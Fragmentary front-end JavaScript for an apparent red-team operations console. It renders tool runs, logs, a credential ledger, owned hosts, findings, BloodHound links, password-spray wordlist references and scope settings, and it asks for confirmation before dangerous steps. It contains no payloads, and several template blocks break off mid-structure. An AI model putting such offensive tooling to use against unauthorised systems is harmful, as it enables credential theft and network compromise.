  out.innerHTML=`<p class="meta">批量结果(${(r.runs||[]).length} 个目标,均后台运行):</p><div class="t">${(r.runs||[]).map(x=>x.dir?`✅ ${esc(x.target)} → 已启动 · 产物:<code>${esc(x.dir)}</code>`:`⏭ ${esc(x.target)} → 跳过:${esc(x.skipped||'')}`).join('<br>')}</div>`;
}
function renderRunResult(out, r){
  if(r.error){ out.innerHTML=`<pre style="color:#ff9aa2">${esc(r.error)}</pre>`; return; }
  if(r.bg){
    out.innerHTML=`<p class="meta">🟡 后台运行中(pid ${r.pid})· 产物:<code>${esc(r.dir)}</code> <button class="cp" style="color:#ff9aa2;border-color:#5c2434" onclick="stopBg(this,'${esc(r.dir)}')">■ 停止</button>(日志每 3s 自动刷新)</p><pre id="lg" style="background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:10px;max-height:420px;overflow:auto;font-size:12px"></pre>`;
    const log=encodeURIComponent(r.log);
    const tick=async()=>{ try{ const x=await(await api('/api/log?p='+log)).json(); const el=document.querySelector('#lg'); if(el) el.innerHTML=colorOut(x.out||'(暂无输出)'); }catch(e){} };
    tick(); window.__poll=setInterval(tick,3000);
  }
  else out.innerHTML=`<p class="meta">退出码 ${r.rc} ${r.rc===0?'✅':'⚠️'} · 产物:<code>${esc(r.dir)}</code></p><pre style="background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:10px;max-height:420px;overflow:auto;font-size:12px">${colorOut(r.out||'(无输出)')}</pre>`;
}
/* confirm 一键重试:409 need_confirm → 内联确认 UI,点击后同一请求体 + confirm:true 重发 */
function confirmRetry(out, r, url, body, done){
  const steps = Array.isArray(r.steps) ? r.steps : (r.name ? [r.name] : []);
  out.innerHTML = `<div class="card" style="border-color:#5c2434;max-width:640px">
    <h4 style="color:#ff9aa2">🟥 ${esc(String(r.error||'危险操作需确认'))}</h4>
    ${steps.length?`<p class="meta">涉及危险步骤/操作:</p><ul style="margin:4px 0 12px 20px">${steps.map(s=>`<li>${esc(String(s))}</li>`).join('')}</ul>`:''}
    <button id="cfgo" style="background:#5c2434;color:#fff;border:none;border-radius:8px;padding:9px 24px;font-size:14px;cursor:pointer">确认执行危险操作</button>
  </div>`;
  $('#cfgo').onclick = async () => {
    out.innerHTML = '<p class="meta">⏳ 已确认,执行中…</p>';
    try{
      const b = JSON.parse(body); b.confirm = true;
      const resp = await api(url, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(b)});
      done(out, await resp.json());
    }catch(e){ out.innerHTML='<pre style="color:#ff9aa2">请求失败: '+esc(e.message)+'</pre>'; }
  };
}

    let h = `<h2 class="vt">📁 项目 ${esc(d.name)}</h2><div id="statebox"></div><div class="grid">

      <div class="card"><h4>常用入口</h4><div class="t">🩸 <a href="http://127.0.0.1:8080" target="_blank">BloodHound CE</a>(19 条固化查询)<br>🌐 多域:<button class="cp" onclick="addDomain()">＋ 添加域</button> · <code>trust-map</code> 拓扑测绘<br>📋 喷洒字典:<code>gen-wordlists.sh</code> · 📊 历史 ↻ 复跑</div></div>
      <div class="card"><h4>时间线(notes.md 最近)</h4><div class="t" style="max-height:340px;overflow:auto">${d.notes.map(l=>esc(l)).join('<br>')}</div></div>
      <div class="card"><h4>凭据台账(${d.creds.length} 条)</h4><div class="t" style="max-height:340px;overflow:auto">${d.creds.length?`<table style="font-size:11px"><tr><th>时间</th><th>类型</th><th>主体</th><th>值(截断)</th><th>来源</th></tr>`+d.creds.slice(-30).map(r=>`<tr><td>${esc(r[0]||'')}</td><td>${esc(r[1]||'')}</td><td>${esc(r[2]||'')}</td><td><code>${esc((r[4]||'').slice(0,28))}…</code></td><td>${esc(r[5]||'')}</td></tr>`).join('')+'</table>':'(空)'}</div></div>
      <div class="card"><h4>执行产物(${d.runs.length} 次)</h4><div class="t">${d.runs.map(r=>esc(r)).join('<br>')||'(空)'}</div></div>
      <div class="card"><h4>结项交付</h4><div class="t">终端运行:<br><code>~/tools/bin/report.sh ${esc(d.name)}</code><br>生成 Markdown+HTML 报告到项目目录</div></div>

    try{  // ai_enabled 时才渲染「🤖 AI 建议」卡片

/* state 面板(statebox):项目战况总览 — 随 renderBoard 一起刷新;404(无激活项目)静默隐藏 */
async function renderState(){
  const sb = $('#statebox'); if(!sb) return;
  let resp;
  try{ resp = await api('/api/project/state'); }catch(e){ sb.style.display='none'; return; }
  if(resp.status === 404){ sb.style.display='none'; sb.innerHTML=''; return; }
  let d; try{ d = await resp.json(); }catch(e){ sb.style.display='none'; return; }
  const m = d.summary || {}, findings = d.findings || [], hosts = d.hosts || {};
  const sevColor = s => s==='高' ? '#ff9aa2' : (s==='中' ? 'var(--warn)' : 'var(--dim)');
  let h = `<div class="card" style="border-color:#24405f;margin-bottom:16px"><h4>📡 战况总览(state)</h4>
    <div class="t" style="margin-bottom:8px">凭据 <b>${esc(String(m.creds_used||0))}</b>/${esc(String(m.creds||0))}已用 · 主机 <b>${esc(String(m.hosts_owned||0))}</b>/${esc(String(m.hosts||0))}拿下 · findings <b>${esc(String(m.findings||0))}</b> · 阶段 ${(m.phases||[]).map(p=>esc(String(p))).join(' ')||'—'}</div>`;
  if(findings.length){
    h += `<p class="meta" style="margin:6px 0 2px">findings(最近在上):</p><div class="t" style="max-height:200px;overflow:auto">`
      + findings.slice(-15).reverse().map(f=>`<div><span style="color:${sevColor(f.severity)}">[${esc(String(f.severity||''))}]</span> ${esc(String(f.title||''))}${f.host?' — '+esc(String(f.host)):''}${f.evidence?` <code>${esc(String(f.evidence))}</code>`:''} <span style="color:var(--dim);font-size:11px">${esc(String(f.ts||''))}</span></div>`).join('')
      + `</div>`;
  }
  const ips = Object.keys(hosts);
  if(ips.length){
    h += `<p class="meta" style="margin:8px 0 2px">主机(${ips.length}):</p><table style="font-size:12px"><tr><th>IP</th><th>角色</th><th>服务</th><th>👑</th><th>首见</th></tr>`
      + ips.map(ip=>{ const x=hosts[ip]||{}; return `<tr><td><code>${esc(ip)}</code></td><td>${esc(String(x.role||''))}${x.os?' · '+esc(String(x.os)):''}</td><td>${(x.services||[]).map(s=>esc(String(s))).join(',')}</td><td>${x.owned?'👑 '+esc(String(x.owned_ts||'')):''}</td><td>${esc(String(x.first_seen||''))}</td></tr>`; }).join('')
      + `</table>`;
  }
  sb.innerHTML = h + '</div>';
  sb.style.display = '';
}

function colorOut(s){
  return s.split('\n').map(l => {
    const e = esc(l);
    if(/^\[(\+|✅|ok\])/i.test(l) || /^OK /i.test(l)) return `<span style="color:var(--acc2)">${e}</span>`;
    if(/^\[(!|x|-|✗|!!)\]/i.test(l) || /^MISS /i.test(l) || /失败|超时/i.test(l)) return `<span style="color:#ff9aa2">${e}</span>`;
    if(/^\[\*\]|警告|WARN/i.test(l)) return `<span style="color:var(--warn)">${e}</span>`;
    return e;
  }).join('\n');
}
async function stopBg(btn, dir){
  btn.disabled = true; btn.textContent = '停止中…';
  try{
    const r = await (await api('/api/stop', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({dir})})).json();
    if(window.__poll){ clearInterval(window.__poll); window.__poll = null; }
    btn.textContent = '已停止(' + (r.stopped ?? r.error) + ')';
  }catch(e){ btn.textContent = '失败:' + e.message; btn.disabled = false; }
}
async function renderHist(){
  if(!$('#v-hist').innerHTML){
    let h='<h2 class="vt">执行历史(最近 60 条)</h2>';
    try{
      const d=await(await api('/api/history')).json();
      h+='<table><tr><th>时间</th><th>工具</th><th>参数</th><th>状态</th><th>命令</th></tr>';
      d.hist.forEach(e=>{ h+=`<tr><td>${esc(e.ts)}</td><td><b>${esc(e.name)}</b>${e.id&&!String(e.id).startsWith('chain')?` <button class="cp" onclick="rerunTool('${esc(e.id)}',this.dataset.p)" data-p='${esc(JSON.stringify(e.params||{}))}'>↻</button>`:''}</td><td style="font-size:12px">${esc(JSON.stringify(e.params||{}))}</td><td>${e.bg?'🟡后台':(e.rc===0?'✅':'⚠️ '+e.rc)}</td><td><code style="font-size:11px">${esc(e.cmd)}</code></td></tr>`; });
      h+='</table>';
    }catch(e){ h+='<p class="meta">需 console.sh 后端</p>'; }
    $('#v-hist').innerHTML=h;
  }
}

    </select></div>
  <div style="margin:6px 0 6px 22px"><label style="color:var(--dim);font-size:12px">Base URL(支持任意第三方中转/网关,含子路径)</label><br>

  <div style="margin:6px 0 6px 22px"><button onclick="aiPing()" style="background:var(--panel2);color:var(--fg);border:1px solid var(--line);border-radius:8px;padding:6px 16px;cursor:pointer;font-size:13px">测试连接</button>
    <span id="ai_ping_msg" class="note" style="margin-left:8px"></span></div>
  <div style="margin:10px 0"><label style="color:var(--dim);font-size:12px">代理(仅存储,供 tools-update.sh 等约定取用)</label><br>
    <input id="cfg_proxy" value="${esc(d.proxy||'')}" placeholder="如 socks5://127.0.0.1:1080" style="${IN}"></div>
  <div style="margin:10px 0"><label style="color:var(--dim);font-size:12px">字典路径(仅存储)</label><br>
    <input id="cfg_wordlist" value="${esc(d.wordlist||'')}" style="${IN}"></div>
  <h4 style="margin:16px 0 6px">BloodHound 连接(redops/bh.json)</h4>

  <div style="margin:6px 0"><label style="color:var(--dim);font-size:12px">用户</label><br><input id="cfg_bh_user" value="${esc(bh.user||'')}" style="${IN}"></div>
  <div style="margin:6px 0"><label style="color:var(--dim);font-size:12px">密码(留空 = 不改)</label><br><input id="cfg_bh_pass" type="password" value="" placeholder="${bh.pass?'已设置(留空保持不变)':'未设置'}" style="${IN}"></div>

  <textarea id="cfg_scope" ${hasProj?'':'disabled'} placeholder="每行一条:CIDR / IP / 域名;# 注释;! 前缀排除" style="${IN};min-height:160px;resize:vertical">${esc(d.scope||'')}</textarea>
